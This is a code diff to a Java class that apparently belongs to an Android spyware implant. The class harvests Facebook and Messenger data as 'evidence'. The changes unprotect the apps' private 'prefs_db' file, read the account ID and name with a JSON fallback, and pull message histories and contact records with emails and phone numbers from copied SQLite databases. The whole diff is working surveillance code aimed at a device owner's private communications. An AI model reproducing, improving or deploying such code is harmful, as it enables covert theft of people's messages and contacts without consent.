@@ -34,7 +34,7 @@ public class ChatFacebook extends SubModuleChat {
 	private static final String TAG = "ChatFacebook";
 
 	private static final int PROGRAM = 0x02;
-	String pObserving = "facebook";
+	String pObserving = "com.facebook.";
 
 	private Date lastTimestamp;
 
@@ -77,20 +77,22 @@ public class ChatFacebook extends SubModuleChat {
 			Check.log(TAG + " (start), read lastFb: " + lastFb);
 		}
 
-		fetchFb(dirKatana);
-
-		fetchFb(dirOrca);
+		if (!fetchFb(dirOrca)) {
+			fetchFb(dirKatana);
+		}
 
 	}
 
-	private void fetchFb(String dir) {
+	private boolean fetchFb(String dir) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchFb) " + dir);
 		}
 		if (readMyAccount(dir)) {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.FACEBOOK, account_uid, account_name);
 			readFbMessageHistory(dir);
+			return true;
 		}
+		return false;
 	}
 
 	@Override
@@ -102,15 +104,16 @@ public class ChatFacebook extends SubModuleChat {
 
 	private boolean readMyAccount(String dbDir) {
 
-		if (!Path.unprotect(dbDir)) {
+		String dbFile = "prefs_db";
+
+		if (!Path.unprotect(dbDir + "/" + dbFile, 3, false)) {
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readMyAccount) cannot unprotect dir");
+				Check.log(TAG + " (readMyAccount) cannot unprotect file: %s/%s", dbDir, dbFile);
 			}
 			return false;
 		}
 
-		String dbFile = "prefs_db";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
 		if (helper == null) {
 			if (Cfg.DEBUG) {
@@ -118,9 +121,9 @@ public class ChatFacebook extends SubModuleChat {
 			}
 			return false;
 		}
-		//SQLiteDatabase db = helper.getReadableDatabase();
+		// SQLiteDatabase db = helper.getReadableDatabase();
 
-		//String[] projection = new String[] { "key", "value" };
+		// String[] projection = new String[] { "key", "value" };
 		String selection = null;
 
 		RecordHashPairVisitor visitor = new RecordHashPairVisitor("key", "value");
@@ -131,8 +134,21 @@ public class ChatFacebook extends SubModuleChat {
 		account_uid = preferences.get("/auth/user_data/fb_uid");
 		account_name = preferences.get("/auth/user_data/fb_username");
 
+		if (StringUtils.isEmpty(account_name)) {
+			String account_user = preferences.get("/auth/user_data/fb_me_user");
+			try {
+				JSONObject root = (JSONObject) new JSONTokener(account_user).nextValue();
+
+				account_uid = root.getString("uid");
+				account_name = root.getString("name");
+			} catch (JSONException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+
 		return (!StringUtils.isEmpty(account_name) && !StringUtils.isEmpty(account_uid));
-		
+
 	}
 
 	private void readFbMessageHistory(String dbDir) {
@@ -181,8 +197,8 @@ public class ChatFacebook extends SubModuleChat {
 					long lastConvId = lastFb.containsKey(conv.id) ? lastFb.get(conv.id) : 0;
 					if (lastConvId < conv.timestamp) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (readFbMessageHistory) lastConvId(" + lastConvId 
-									+ ") < conv.timestamp("+ conv.timestamp +")");
+							Check.log(TAG + " (readFbMessageHistory) lastConvId(" + lastConvId + ") < conv.timestamp("
+									+ conv.timestamp + ")");
 						}
 						long lastReadId = (long) fetchMessages(helper, conv, lastConvId);
 
@@ -219,9 +235,7 @@ public class ChatFacebook extends SubModuleChat {
 					String body = cursor.getString(0);
 					String sender = cursor.getString(1);
 
-					JSONObject root;
-
-					root = (JSONObject) new JSONTokener(sender).nextValue();
+					JSONObject root = (JSONObject) new JSONTokener(sender).nextValue();
 					String peer = root.getString("email").split("@")[0];
 					String name = root.getString("name");
 
@@ -349,7 +363,7 @@ public class ChatFacebook extends SubModuleChat {
 		}
 		String dbFile = "users_db2";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-		//SQLiteDatabase db = helper.getReadableDatabase();
+		// SQLiteDatabase db = helper.getReadableDatabase();
 
 		String[] projection = new String[] { "fbid", "first_name", "last_name", "name", "email_addresses",
 				"phone_numbers" };
@@ -366,7 +380,7 @@ public class ChatFacebook extends SubModuleChat {
 		}
 		String dbFile = "contacts_db2";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-		//SQLiteDatabase db = helper.getReadableDatabase();
+		// SQLiteDatabase db = helper.getReadableDatabase();
 
 		RecordListVisitor visitor = new RecordListVisitor("data");
 		helper.traverseRecords("contacts", visitor);
